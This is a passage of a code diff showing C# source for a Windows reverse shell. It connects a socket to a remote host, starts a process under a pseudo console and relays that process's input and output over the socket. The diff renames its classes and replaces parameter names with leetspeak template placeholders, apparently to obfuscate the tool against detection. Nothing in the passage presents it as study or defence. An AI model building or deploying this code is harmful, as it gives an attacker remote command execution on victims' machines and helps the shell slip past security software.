+    private static extern bool CloseHandle(IntPtr ${h0bj3ct});
 
     [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-    private static extern bool CreatePipe(out IntPtr hReadPipe, out IntPtr hWritePipe, ref SECURITY_ATTRIBUTES lpPipeAttributes, int nSize);
+    private static extern bool CreatePipe(out IntPtr ${hR34dP1p3}, out IntPtr ${hWr1t3P1p3}, ref SECURITY_ATTRIBUTES ${lpP1p34ttr1but35}, int ${nS1z3});
 
     [DllImport("kernel32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall, SetLastError = true)]
-    private static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr SecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);
+    private static extern IntPtr CreateFile(string ${lpF1l3N4m3}, uint ${dwD351r3d4cc355}, uint ${dwSh4r3M0d3}, IntPtr ${S3cur1ty4ttr1but35}, uint ${dwCr34t10nD1sp0s1t10n}, uint ${dwFl4g54nd4ttr1but35}, IntPtr ${hT3mpl4t3F1l3});
 
     [DllImport("kernel32.dll", SetLastError = true)]
-    private static extern bool ReadFile(IntPtr hFile, [Out] byte[] lpBuffer, uint nNumberOfBytesToRead, out uint lpNumberOfBytesRead, IntPtr lpOverlapped);
+    private static extern bool ReadFile(IntPtr ${hF1l3}, [Out] byte[] ${lpBuff3r}, uint ${nNum83r0fByt35T0R34d}, out uint ${lpNum83r0fByt35R34d}, IntPtr ${lp0v3rl4pp3d});
 
     [DllImport("kernel32.dll", SetLastError = true)]
-    private static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);
+    private static extern bool WriteFile(IntPtr ${hF1l3}, byte[] ${lpBuff3r}, uint ${nNum83r0fByt35T0Wr1t3}, out uint ${lpNum83r0fByt35Wr1tt3n}, IntPtr ${lp0v3rl4pp3d});
 
     [DllImport("kernel32.dll", SetLastError = true)]
-    private static extern int CreatePseudoConsole(COORD size, IntPtr hInput, IntPtr hOutput, uint dwFlags, out IntPtr phPC);
+    private static extern int CreatePseudoConsole(COORD ${s1z3}, IntPtr ${h1nput}, IntPtr ${h0utput}, uint ${dwFl4g5}, out IntPtr ${phPC});
 
     [DllImport("kernel32.dll", SetLastError = true)]
-    private static extern int ClosePseudoConsole(IntPtr hPC);
+    private static extern int ClosePseudoConsole(IntPtr ${hPC});
 
     [DllImport("kernel32.dll", SetLastError = true)]
-    private static extern bool SetConsoleMode(IntPtr hConsoleHandle, uint mode);
+    private static extern bool SetConsoleMode(IntPtr ${hC0ns0l3H4ndl3}, uint ${m0d3});
 
     [DllImport("kernel32.dll", SetLastError = true)]
-    private static extern bool GetConsoleMode(IntPtr handle, out uint mode);
+    private static extern bool GetConsoleMode(IntPtr ${h4ndl3}, out uint ${m0d3});
 
     [DllImport("kernel32.dll")]
     [return: MarshalAs(UnmanagedType.Bool)]
@@ -1027,118 +933,118 @@ public static class CONTs
     private static extern bool FreeConsole();
 
     [DllImport("user32.dll")]
-    private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+    private static extern bool ShowWindow(IntPtr ${hWnd}, int ${nCmdSh0w});
 
     [DllImport("kernel32.dll")]
     private static extern IntPtr GetConsoleWindow();
 
     [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
-    private static extern IntPtr GetModuleHandle(string lpModuleName);
+    private static extern IntPtr GetModuleHandle(string ${lpM0dul3N4m3});
 
     [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
-    private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+    private static extern IntPtr GetProcAddress(IntPtr ${hM0dul3}, string ${pr0cN4m3});
 
     [DllImport("ws2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
-    private static extern IntPtr WSASocket([In] AddressFamily addressFamily, [In] SocketType socketType, [In] ProtocolType protocolType, [In] IntPtr protocolInfo, [In] uint group, [In] int flags);
+    private static extern IntPtr WSASocket([In] AddressFamily ${4ddr355F4m1ly}, [In] SocketType ${s0ck3tTyp3}, [In] ProtocolType ${pr0t0c0lTyp3}, [In] IntPtr ${pr0t0c0l1nf0}, [In] uint ${gr0up}, [In] int ${fl4g5});
 
     [DllImport("ws2_32.dll", SetLastError = true)]
-    private static extern int connect(IntPtr s, ref SOCKADDR_IN addr, int addrsize);
+    private static extern int connect(IntPtr ${5}, ref SOCKADDR_IN ${4ddr}, int ${4ddrs1z3});
 
     [DllImport("ws2_32.dll", SetLastError = true)]
-    private static extern ushort htons(ushort hostshort);
+    private static extern ushort htons(ushort ${h0stsh0rt});
 
     [DllImport("ws2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
-    private static extern uint inet_addr(string cp);
+    private static extern uint inet_addr(string ${cp});
 
     [DllImport("ws2_32.dll", CharSet = CharSet.Auto)]
     private static extern Int32 WSAGetLastError();
 
     [DllImport("ws2_32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-    private static extern Int32 WSAStartup(Int16 wVersionRequested, out WSAData wsaData);
+    private static extern Int32 WSAStartup(Int16 ${wV3rs10nR3qu3st3d}, out WSAData ${ws4D4t4});
 
     [DllImport("ws2_32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
-    private static extern int closesocket(IntPtr s);
+    private static extern int closesocket(IntPtr ${5});
 
     [DllImport("ws2_32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-    private static extern int recv(IntPtr Socket, byte[] buf, int len, uint flags);
+    private static extern int recv(IntPtr ${S0ck3t}, byte[] ${buf}, int ${l3n}, uint ${fl4g5});
 
     [DllImport("ws2_32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-    private static extern int send(IntPtr Socket, byte[] buf, int len, uint flags);
+    private static extern int send(IntPtr ${S0ck3t}, byte[] ${buf}, int ${l3n}, uint ${fl4g5});
 
     [DllImport("WS2_32.DLL", CharSet = CharSet.Auto, SetLastError = true)]
     private static extern IntPtr WSACreateEvent();
 
     [DllImport("WS2_32.DLL", CharSet = CharSet.Auto, SetLastError = true)]
-    private static extern int WSAEventSelect(IntPtr s, IntPtr hEventObject, int lNetworkEvents);
+    private static extern int WSAEventSelect(IntPtr ${5}, IntPtr ${h3v3nt0bj3ct}, int ${lN3tw0rk3v3nt5});
 
     [DllImport("WS2_32.DLL", CharSet = CharSet.Auto, SetLastError = true)]
-    private static extern int WSAWaitForMultipleEvents(int cEvents, IntPtr[] lphEvents, bool fWaitAll, int dwTimeout, bool fAlertable);
+    private static extern int WSAWaitForMultipleEvents(int ${c3v3nt5}, IntPtr[] ${lph3v3nt5}, bool ${fW41t4ll}, int ${dwT1m30ut}, bool ${f4l3rt4bl3});
 
     [DllImport("WS2_32.DLL", CharSet = CharSet.Auto, SetLastError = true)]
-    private static extern bool WSAResetEvent(IntPtr hEvent);
+    private static extern bool WSAResetEvent(IntPtr ${h3v3nt});
 
     [DllImport("WS2_32.DLL", CharSet = CharSet.Auto, SetLastError = true)]
-    private static extern bool WSACloseEvent(IntPtr hEvent);
+    private static extern bool WSACloseEvent(IntPtr ${h3v3nt});
 
     [DllImport("ntdll.dll")]
-    private static extern uint NtSuspendProcess(IntPtr processHandle);
+    private static extern uint NtSuspendProcess(IntPtr ${pr0c355H4ndl3});
 
     [DllImport("ntdll.dll")]
-    private static extern uint NtResumeProcess(IntPtr processHandle);
+    private static extern uint NtResumeProcess(IntPtr ${pr0c355H4ndl3});
 
     private static void InitWSAThread()
     {
-        WSAData data;
-        if (WSAStartup(2 << 8 | 2, out data) != 0)
-            throw new CONTsException(String.Format("WSAStartup failed with error code: {0}", WSAGetLastError()));
+        WSAData ${d4t4};
+        if (WSAStartup(2 << 8 | 2, out ${d4t4}) != 0)
+            throw new CPTSHException(String.Format("WSAStartup failed with error code: {0}", WSAGetLastError()));
     }
 
-    private static IntPtr connectRemote(string remoteIp, int remotePort)
+    private static IntPtr connectRemote(string ${r3m0t31p}, int ${r3m0t3P0rt})
     {
-        int port = 0;
-        int error = 0;
-        string host = remoteIp;
+        int ${p0rt} = 0;
+        int ${3rr0r} = 0;
+        string ${h0st} = ${r3m0t31p};
 
         try
         {
-            port = Convert.ToInt32(remotePort);
+            ${p0rt} = Convert.ToInt32(${r3m0t3P0rt});
         }
         catch
         {
-            throw new CONTsException("Specified port is invalid: " + remotePort.ToString());
+            throw new CPTSHException("Specified port is invalid: " + ${r3m0t3P0rt}.ToString());
         }
 
-        IntPtr socket = IntPtr.Zero;
-        socket = WSASocket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.IP, IntPtr.Zero, 0, WSA_FLAG_OVERLAPPED);
-        SOCKADDR_IN sockinfo = new SOCKADDR_IN();
-        sockinfo.sin_family = (short)2;
-        sockinfo.sin_addr = inet_addr(host);
-        sockinfo.sin_port = (short)htons((ushort)port);
+        IntPtr ${s0ck3t} = IntPtr.Zero;
+        ${s0ck3t} = WSASocket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.IP, IntPtr.Zero, 0, ${WSAFL4G0V3RL4PP3D});
+        SOCKADDR_IN ${s0ck1nf0} = new SOCKADDR_IN();
+        ${s0ck1nf0}.sin_family = (short)2;
+        ${s0ck1nf0}.sin_addr = inet_addr(${h0st});
+        ${s0ck1nf0}.sin_port = (short)htons((ushort)${p0rt});
 
-        if (connect(socket, ref sockinfo, Marshal.SizeOf(sockinfo)) != 0)
+        if (connect(${s0ck3t}, ref ${s0ck1nf0}, Marshal.SizeOf(${s0ck1nf0})) != 0)
         {
-            error = WSAGetLastError();
-            throw new CONTsException(String.Format("WSAConnect failed with error code: {0}", error));
+            ${3rr0r} = WSAGetLastError();
+            throw new CPTSHException(String.Format("WSAConnect failed with error code: {0}", ${3rr0r}));
         }
 
-        return socket;
+        return ${s0ck3t};
     }
 
-    private static void TryParseRowsColsFromSocket(IntPtr shellSocket, ref uint rows, ref uint cols)
+    private static void TryParseRowsColsFromSocket(IntPtr ${sh3llS0ck3t}, ref uint ${r0w5}, ref uint ${c0l5})
     {
-        Thread.Sleep(500);//little tweak for slower connections
-        byte[] received = new byte[100];
-        int rowsTemp, colsTemp;
-        int bytesReceived = recv(shellSocket, received, 100, 0);
+        Thread.Sleep(500);
+        byte[] ${r3c31v3d} = new byte[100];
+        int ${r0w5T3mp}, ${c0l5T3mp};
+        int ${byt35R3c31v3d} = recv(${sh3llS0ck3t}, ${r3c31v3d}, 100, 0);
         try
         {
-            string sizeReceived = Encoding.ASCII.GetString(received, 0, bytesReceived);
-            string rowsString = sizeReceived.Split(' ')[0].Trim();
-            string colsString = sizeReceived.Split(' ')[1].Trim();
-            if (Int32.TryParse(rowsString, out rowsTemp) && Int32.TryParse(colsString, out colsTemp))
+            string ${s1z3R3c31v3d} = Encoding.ASCII.GetString(${r3c31v3d}, 0, ${byt35R3c31v3d});
+            string ${r0w5Str1ng} = ${s1z3R3c31v3d}.Split(' ')[0].Trim();
+            string ${c0l5Str1ng} = ${s1z3R3c31v3d}.Split(' ')[1].Trim();
+            if (Int32.TryParse(${r0w5Str1ng}, out ${r0w5T3mp}) && Int32.TryParse(${c0l5Str1ng}, out ${c0l5T3mp}))
             {
-                rows = (uint)rowsTemp;
-                cols = (uint)colsTemp;
+                ${r0w5} = (uint)${r0w5T3mp};
+                ${c0l5} = (uint)${c0l5T3mp};
             }
         }
         catch
@@ -1147,502 +1053,473 @@ public static class CONTs
         }
     }
 
-    private static void CreatePipes(ref IntPtr InputPipeRead, ref IntPtr InputPipeWrite, ref IntPtr OutputPipeRead, ref IntPtr OutputPipeWrite)
+    private static void CreatePipes(ref IntPtr ${1nputP1p3R34d}, ref IntPtr ${1nputP1p3Wr1t3}, ref IntPtr ${0utputP1p3R34d}, ref IntPtr ${0utputP1p3Wr1t3})
     {
-        SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
-        pSec.nLength = Marshal.SizeOf(pSec);
-        pSec.bInheritHandle = 1;
-        pSec.lpSecurityDescriptor = IntPtr.Zero;
-        if (!CreatePipe(out InputPipeRead, out InputPipeWrite, ref pSec, BUFFER_SIZE_PIPE))
-            throw new CONTsException("Could not create the InputPipe");
-        if (!CreatePipe(out OutputPipeRead, out OutputPipeWrite, ref pSec, BUFFER_SIZE_PIPE))
-            throw new CONTsException("Could not create the OutputPipe");
+        SECURITY_ATTRIBUTES ${pS3c} = new SECURITY_ATTRIBUTES();
+        ${pS3c}.nLength = Marshal.SizeOf(${pS3c});
+        ${pS3c}.bInheritHandle = 1;
+        ${pS3c}.lpSecurityDescriptor = IntPtr.Zero;
+        if (!CreatePipe(out ${1nputP1p3R34d}, out ${1nputP1p3Wr1t3}, ref ${pS3c}, ${BUFF3RS1Z3P1P3}))
+            throw new CPTSHException("Could not create the InputPipe");
+        if (!CreatePipe(out ${0utputP1p3R34d}, out ${0utputP1p3Wr1t3}, ref ${pS3c}, ${BUFF3RS1Z3P1P3}))
+            throw new CPTSHException("Could not create the OutputPipe");
     }
 
-    private static void InitConsole(ref IntPtr oldStdIn, ref IntPtr oldStdOut, ref IntPtr oldStdErr)
+    private static void InitConsole(ref IntPtr ${0ldStd1n}, ref IntPtr ${0ldStd0ut}, ref IntPtr ${0ldStd3rr})
     {
-        oldStdIn = GetStdHandle(STD_INPUT_HANDLE);
-        oldStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
-        oldStdErr = GetStdHandle(STD_ERROR_HANDLE);
-        IntPtr hStdout = CreateFile("CONOUT$", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, IntPtr.Zero, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);
-        IntPtr hStdin = CreateFile("CONIN$", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, IntPtr.Zero, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);
-        SetStdHandle(STD_OUTPUT_HANDLE, hStdout);
-        SetStdHandle(STD_ERROR_HANDLE, hStdout);
-        SetStdHandle(STD_INPUT_HANDLE, hStdin);
+        ${0ldStd1n} = GetStdHandle(${STD1NPUTH4NDL3});
+        ${0ldStd0ut} = GetStdHandle(${STD0UTPUTH4NDL3});
+        ${0ldStd3rr} = GetStdHandle(${STD3RR0RH4NDL3});
+        IntPtr ${hStd0ut} = CreateFile("CONOUT$", ${G3N3R1CR34D} | ${G3N3R1CWR1T3}, ${F1L3SH4R3R34D} | ${F1L3SH4R3WR1T3}, IntPtr.Zero, ${0P3N3X1ST1NG}, ${F1L34TTR1BUT3N0RM4L}, IntPtr.Zero);
+        IntPtr ${hStd1n} = CreateFile("CONIN$", ${G3N3R1CR34D} | ${G3N3R1CWR1T3}, ${F1L3SH4R3R34D} | ${F1L3SH4R3WR1T3}, IntPtr.Zero, ${0P3N3X1ST1NG}, ${F1L34TTR1BUT3N0RM4L}, IntPtr.Zero);
+        SetStdHandle(${STD0UTPUTH4NDL3}, ${hStd0ut});
+        SetStdHandle(${STD3RR0RH4NDL3}, ${hStd0ut});
+        SetStdHandle(${STD1NPUTH4NDL3}, ${hStd1n});
     }
 
-    private static void RestoreStdHandles(IntPtr oldStdIn, IntPtr oldStdOut, IntPtr oldStdErr)
+    private static void RestoreStdHandles(IntPtr ${0ldStd1n}, IntPtr ${0ldStd0ut}, IntPtr ${0ldStd3rr})
     {
-        SetStdHandle(STD_OUTPUT_HANDLE, oldStdOut);
-        SetStdHandle(STD_ERROR_HANDLE, oldStdErr);
-        SetStdHandle(STD_INPUT_HANDLE, oldStdIn);
+        SetStdHandle(${STD0UTPUTH4NDL3}, ${0ldStd0ut});
+        SetStdHandle(${STD3RR0RH4NDL3}, ${0ldStd3rr});
+        SetStdHandle(${STD1NPUTH4NDL3}, ${0ldStd1n});
     }
 
     private static void EnableVirtualTerminalSequenceProcessing()
     {
-        uint outConsoleMode = 0;
-        IntPtr hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
-        if (!GetConsoleMode(hStdOut, out outConsoleMode))
+        uint ${0utC0ns0l3M0d3} = 0;
+        IntPtr ${hStd0ut} = GetStdHandle(${STD0UTPUTH4NDL3});
+        if (!GetConsoleMode(${hStd0ut}, out ${0utC0ns0l3M0d3}))
         {
-            throw new CONTsException("Could not get console mode");
+            throw new CPTSHException("Could not get console mode");
         }
-        outConsoleMode |= ENABLE_VIRTUAL_TERMINAL_PROCESSING | DISABLE_NEWLINE_AUTO_RETURN;
-        if (!SetConsoleMode(hStdOut, outConsoleMode))
+        ${0utC0ns0l3M0d3} |= ${3N4BL3V1RTU4LT3RM1N4LPR0C3551NG} | ${D1S4BL3N3WL1N34UT0R3TURN};
+        if (!SetConsoleMode(${hStd0ut}, ${0utC0ns0l3M0d3}))
         {
-            throw new CONTsException("Could not enable virtual terminal processing");
+            throw new CPTSHException("Could not enable virtual terminal processing");
         }
     }
 
-    private static int CreatePseudoConsoleWithPipes(ref IntPtr handlePseudoConsole, ref IntPtr ConPtyInputPipeRead, ref IntPtr ConPtyOutputPipeWrite, uint rows, uint cols)
+    private static int CreatePseudoConsoleWithPipes(ref IntPtr ${h4ndl3P53ud0C0ns0l3}, ref IntPtr ${C0nPty1nputP1p3R34d}, ref IntPtr ${C0nPty0utputP1p3Wr1t3}, uint ${r0w5}, uint ${c0l5})
     {
-        int result = -1;
+        int ${r3sult} = -1;
         EnableVirtualTerminalSequenceProcessing();
-        COORD consoleCoord = new COORD();
-        consoleCoord.X = (short)cols;
-        consoleCoord.Y = (short)rows;
-        result = CreatePseudoConsole(consoleCoord, ConPtyInputPipeRead, ConPtyOutputPipeWrite, 0, out handlePseudoConsole);
-        return result;
+        COORD ${c0ns0l3C00rd} = new COORD();
+        ${c0ns0l3C00rd}.X = (short)${c0l5};
+        ${c0ns0l3C00rd}.Y = (short)${r0w5};
+        ${r3sult} = CreatePseudoConsole(${c0ns0l3C00rd}, ${C0nPty1nputP1p3R34d}, ${C0nPty0utputP1p3Wr1t3}, 0, out ${h4ndl3P53ud0C0ns0l3});
+        return ${r3sult};
     }
 
-    private static STARTUPINFOEX ConfigureProcessThread(IntPtr handlePseudoConsole, IntPtr attributes)
+    private static STARTUPINFOEX ConfigureProcessThread(IntPtr ${h4ndl3P53ud0C0ns0l3}, IntPtr ${4ttr1but35})
     {
-        IntPtr lpSize = IntPtr.Zero;
-        bool success = InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
-        if (success || lpSize == IntPtr.Zero)
+        IntPtr ${lpS1z3} = IntPtr.Zero;
+        bool ${succ355} = InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref ${lpS1z3});
+        if (${succ355} || ${lpS1z3} == IntPtr.Zero)
         {
-            throw new CONTsException("Could not calculate the number of bytes for the attribute list. " + Marshal.GetLastWin32Error());
+            throw new CPTSHException("Could not calculate the number of bytes for the attribute list. " + Marshal.GetLastWin32Error());
         }
-        STARTUPINFOEX startupInfo = new STARTUPINFOEX();
-        startupInfo.StartupInfo.cb = Marshal.SizeOf(startupInfo);
-        startupInfo.lpAttributeList = Marshal.AllocHGlobal(lpSize);
-        success = InitializeProcThreadAttributeList(startupInfo.lpAttributeList, 1, 0, ref lpSize);
-        if (!success)
+        STARTUPINFOEX ${st4rtup1nf0} = new STARTUPINFOEX();
+        ${st4rtup1nf0}.StartupInfo.cb = Marshal.SizeOf(${st4rtup1nf0});
+        ${st4rtup1nf0}.lpAttributeList = Marshal.AllocHGlobal(${lpS1z3});
+        ${succ355} = InitializeProcThreadAttributeList(${st4rtup1nf0}.lpAttributeList, 1, 0, ref ${lpS1z3});
+        if (!${succ355})
         {
-            throw new CONTsException("Could not set up attribute list. " + Marshal.GetLastWin32Error());
+            throw new CPTSHException("Could not set up attribute list. " + Marshal.GetLastWin32Error());
         }
-        success = UpdateProcThreadAttribute(startupInfo.lpAttributeList, 0, attributes, handlePseudoConsole, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);
-        if (!success)
+        ${succ355} = UpdateProcThreadAttribute(${st4rtup1nf0}.lpAttributeList, 0, ${4ttr1but35}, ${h4ndl3P53ud0C0ns0l3}, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);
+        if (!${succ355})
         {
-            throw new CONTsException("Could not set pseudoconsole thread attribute. " + Marshal.GetLastWin32Error());
+            throw new CPTSHException("Could not set pseudoconsole thread attribute. " + Marshal.GetLastWin32Error());
         }
-        return startupInfo;
+        return ${st4rtup1nf0};
     }
 
-    private static PROCESS_INFORMATION RunProcess(ref STARTUPINFOEX sInfoEx, string commandLine)
+    private static PROCESS_INFORMATION RunProcess(ref STARTUPINFOEX ${s1nf0Ex}, string ${c0mm4ndL1n3})
     {
-        PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();
-        SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
-        int securityAttributeSize = Marshal.SizeOf(pSec);
-        pSec.nLength = securityAttributeSize;
-        SECURITY_ATTRIBUTES tSec = new SECURITY_ATTRIBUTES();
-        tSec.nLength = securityAttributeSize;
-        bool success = CreateProcessEx(null, commandLine, ref pSec, ref tSec, false, EXTENDED_STARTUPINFO_PRESENT, IntPtr.Zero, null, ref sInfoEx, out pInfo);
-        if (!success)
+        PROCESS_INFORMATION ${p1nf0} = new PROCESS_INFORMATION();
+        SECURITY_ATTRIBUTES ${pS3c} = new SECURITY_ATTRIBUTES();
+        int ${s3cur1ty4ttr1but3S1z3} = Marshal.SizeOf(${pS3c});
+        ${pS3c}.nLength = ${s3cur1ty4ttr1but3S1z3};
+        SECURITY_ATTRIBUTES ${tS3c} = new SECURITY_ATTRIBUTES();
+        ${tS3c}.nLength = ${s3cur1ty4ttr1but3S1z3};
+        bool ${succ355} = CreateProcessEx(null, ${c0mm4ndL1n3}, ref ${pS3c}, ref ${tS3c}, false, ${3XT3ND3DST4RTUP1NF0PR3S3NT}, IntPtr.Zero, null, ref ${s1nf0Ex}, out ${p1nf0});
+        if (!${succ355})
         {
-            throw new CONTsException("Could not create process. " + Marshal.GetLastWin32Error());
+            throw new CPTSHException("Could not create process. " + Marshal.GetLastWin32Error());
         }
-        return pInfo;
+        return ${p1nf0};
     }
 
-    private static PROCESS_INFORMATION CreateChildProcessWithPseudoConsole(IntPtr handlePseudoConsole, string commandLine)
+    private static PROCESS_INFORMATION CreateChildProcessWithPseudoConsole(IntPtr ${h4ndl3P53ud0C0ns0l3}, string ${c0mm4ndL1n3})
     {
-        STARTUPINFOEX startupInfo = ConfigureProcessThread(handlePseudoConsole, (IntPtr)PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE);
-        PROCESS_INFORMATION processInfo = RunProcess(ref startupInfo, commandLine);
-        return processInfo;
+        STARTUPINFOEX ${st4rtup1nf0} = ConfigureProcessThread(${h4ndl3P53ud0C0ns0l3}, (IntPtr)${PR0CTHR34D4TTR1BUT3P53UD0C0NS0L3});
+        PROCESS_INFORMATION ${pr0c3551nf0} = RunProcess(ref ${st4rtup1nf0}, ${c0mm4ndL1n3});
+        return ${pr0c3551nf0};
     }
 
-    private static void ThreadReadPipeWriteSocketOverlapped(object threadParams)
+    private static void ThreadReadPipeWriteSocketOverlapped(object ${thr34dP4r4m5})
     {
-        object[] threadParameters = (object[])threadParams;
-        IntPtr OutputPipeRead = (IntPtr)threadParameters[0];
-        IntPtr shellSocket = (IntPtr)threadParameters[1];
-        int bufferSize = 8192;
-        bool readSuccess = false;
-        Int32 bytesSent = 0;
-        uint dwBytesRead = 0;
+        object[] ${thr34dP4r4m3t3r5} = (object[])${thr34dP4r4m5};
+        IntPtr ${0utputP1p3R34d} = (IntPtr)${thr34dP4r4m3t3r5}[0];
+        IntPtr ${sh3llS0ck3t} = (IntPtr)${thr34dP4r4m3t3r5}[1];
+        int ${buff3rS1z3} = 8192;
+        bool ${r34dSucc355} = false;
+        Int32 ${byt35S3nt} = 0;
+        uint ${dwByt35R34d} = 0;
         do
         {
-            byte[] bytesToWrite = new byte[bufferSize];
-            readSuccess = ReadFile(OutputPipeRead, bytesToWrite, (uint)bufferSize, out dwBytesRead, IntPtr.Zero);
-            bytesSent = send(shellSocket, bytesToWrite, (int)dwBytesRead, 0);
-        } while (bytesSent > 0 && readSuccess);
-        // Console.WriteLine("debug: bytesSent = " + bytesSent + " WSAGetLastError() = " + WSAGetLastError().ToString());
+            byte[] ${byt35T0Wr1t3} = new byte[${buff3rS1z3}];
+            ${r34dSucc355} = ReadFile(${0utputP1p3R34d}, ${byt35T0Wr1t3}, (uint)${buff3rS1z3}, out ${dwByt35R34d}, IntPtr.Zero);
+            ${byt35S3nt} = send(${sh3llS0ck3t}, ${byt35T0Wr1t3}, (int)${dwByt35R34d}, 0);
+        } while (${byt35S3nt} > 0 && ${r34dSucc355});
     }
 
-    private static void ThreadReadPipeWriteSocketNonOverlapped(object threadParams)
+    private static void ThreadReadPipeWriteSocketNonOverlapped(object ${thr34dP4r4m5})
     {
-        object[] threadParameters = (object[])threadParams;
-        IntPtr OutputPipeRead = (IntPtr)threadParameters[0];
-        IntPtr shellSocket = (IntPtr)threadParameters[1];
-        int bufferSize = 8192;
-        bool readSuccess = false;
-        Int32 bytesSent = 0;
-        uint dwBytesRead = 0;
+        object[] ${thr34dP4r4m3t3r5} = (object[])${thr34dP4r4m5};
+        IntPtr ${0utputP1p3R34d} = (IntPtr)${thr34dP4r4m3t3r5}[0];
+        IntPtr ${sh3llS0ck3t} = (IntPtr)${thr34dP4r4m3t3r5}[1];
+        int ${buff3rS1z3} = 8192;
+        bool ${r34dSucc355} = false;
+        Int32 ${byt35S3nt} = 0;
+        uint ${dwByt35R34d} = 0;
         do
         {
-            byte[] bytesToWrite = new byte[bufferSize];
-            readSuccess = ReadFile(OutputPipeRead, bytesToWrite, (uint)bufferSize, out dwBytesRead, IntPtr.Zero);
-            // Console.WriteLine("debug ThreadReadPipeWriteSocket ReadFile: dwBytesRead = " + dwBytesRead + " Marshal.GetLastWin32Error() " + Marshal.GetLastWin32Error());
+            byte[] ${byt35T0Wr1t3} = new byte[${buff3rS1z3}];
+            ${r34dSucc355} = ReadFile(${0utputP1p3R34d}, ${byt35T0Wr1t3}, (uint)${buff3rS1z3}, out ${dwByt35R34d}, IntPtr.Zero);
             do
             {
-                bytesSent = send(shellSocket, bytesToWrite, (int)dwBytesRead, 0);
-                // Console.WriteLine("debug ThreadReadPipeWriteSocket send: bytesSent = " + bytesSent + " WSAGetLastError() = " + WSAGetLastError().ToString());
-            } while (WSAGetLastError() == WSAEWOULDBLOCK);
-        } while (bytesSent > 0 && readSuccess);
+                ${byt35S3nt} = send(${sh3llS0ck3t}, ${byt35T0Wr1t3}, (int)${dwByt35R34d}, 0);
+            } while (WSAGetLastError() == ${WSA3WOULDBL0CK});
+        } while (${byt35S3nt} > 0 && ${r34dSucc355});
     }
 
-    private static Thread StartThreadReadPipeWriteSocket(IntPtr OutputPipeRead, IntPtr shellSocket, bool overlappedSocket)
+    private static Thread StartThreadReadPipeWriteSocket(IntPtr ${0utputP1p3R34d}, IntPtr ${sh3llS0ck3t}, bool ${0v3rl4pp3dS0ck3t})
     {
-        object[] threadParameters = new object[2];
-        threadParameters[0] = OutputPipeRead;
-        threadParameters[1] = shellSocket;
-        Thread thThreadReadPipeWriteSocket;
-        if(overlappedSocket)
-            thThreadReadPipeWriteSocket = new Thread(ThreadReadPipeWriteSocketOverlapped);
+        object[] ${thr34dP4r4m3t3r5} = new object[2];
+        ${thr34dP4r4m3t3r5}[0] = ${0utputP1p3R34d};
+        ${thr34dP4r4m3t3r5}[1] = ${sh3llS0ck3t};
+        Thread ${thThr34dR34dP1p3Wr1t3S0ck3t};
+        if(${0v3rl4pp3dS0ck3t})
+            ${thThr34dR34dP1p3Wr1t3S0ck3t} = new Thread(ThreadReadPipeWriteSocketOverlapped);
         else
-            thThreadReadPipeWriteSocket = new Thread(ThreadReadPipeWriteSocketNonOverlapped);
-        thThreadReadPipeWriteSocket.Start(threadParameters);
-        return thThreadReadPipeWriteSocket;
+            ${thThr34dR34dP1p3Wr1t3S0ck3t} = new Thread(ThreadReadPipeWriteSocketNonOverlapped);
+        ${thThr34dR34dP1p3Wr1t3S0ck3t}.Start(${thr34dP4r4m3t3r5});
+        return ${thThr34dR34dP1p3Wr1t3S0ck3t};
     }
 
-    private static void ThreadReadSocketWritePipeOverlapped(object threadParams)
+    private static void ThreadReadSocketWritePipeOverlapped(object ${thr34dP4r4m5})
     {
-        object[] threadParameters = (object[])threadParams;
-        IntPtr InputPipeWrite = (IntPtr)threadParameters[0];
-        IntPtr shellSocket = (IntPtr)threadParameters[1];
-        IntPtr hChildProcess = (IntPtr)threadParameters[2];
-        int bufferSize = 8192;
-        bool writeSuccess = false;
-        Int32 nBytesReceived = 0;
-        uint bytesWritten = 0;
+        object[] ${thr34dP4r4m3t3r5} = (object[])${thr34dP4r4m5};
+        IntPtr ${1nputP1p3Wr1t3} = (IntPtr)${thr34dP4r4m3t3r5}[0];
+        IntPtr ${sh3llS0ck3t} = (IntPtr)${thr34dP4r4m3t3r5}[1];
+        IntPtr ${hCh1ldPr0c355} = (IntPtr)${thr34dP4r4m3t3r5}[2];
+        int ${buff3rS1z3} = 8192;
+        bool ${wr1t3Succ355} = false;
+        Int32 ${nByt35R3c31v3d} = 0;
+        uint ${byt35Wr1tt3n} = 0;
         do
         {
-            byte[] bytesReceived = new byte[bufferSize];
-            nBytesReceived = recv(shellSocket, bytesReceived, bufferSize, 0);
-            writeSuccess = WriteFile(InputPipeWrite, bytesReceived, (uint)nBytesReceived, out bytesWritten, IntPtr.Zero);
-        } while (nBytesReceived > 0 && writeSuccess);
